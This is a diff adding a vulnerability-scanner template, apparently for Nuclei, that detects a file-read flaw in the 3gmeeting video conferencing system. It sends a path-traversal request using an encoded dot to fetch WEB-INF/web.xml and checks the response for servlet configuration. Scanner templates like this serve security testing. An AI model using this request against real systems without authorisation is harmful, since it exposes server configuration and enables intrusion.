@@ -1,0 +1,28 @@
+id: 3gmeeting-lfi
+
+info:
+  name: 3gmeeting - lfi
+  author: Str1am    
+  severity: high
+  description: 3gmeeting 视讯系统 /%c0%ae/WEB-INF/web.xml" 文件读取
+  metadata:
+    verified: true
+    max-request: 1
+  tags: 3gmeeting,lfi
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%c0%ae/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jsp-config"
+          - "<servlet-mapping>"
+        part: body
+        condition: and
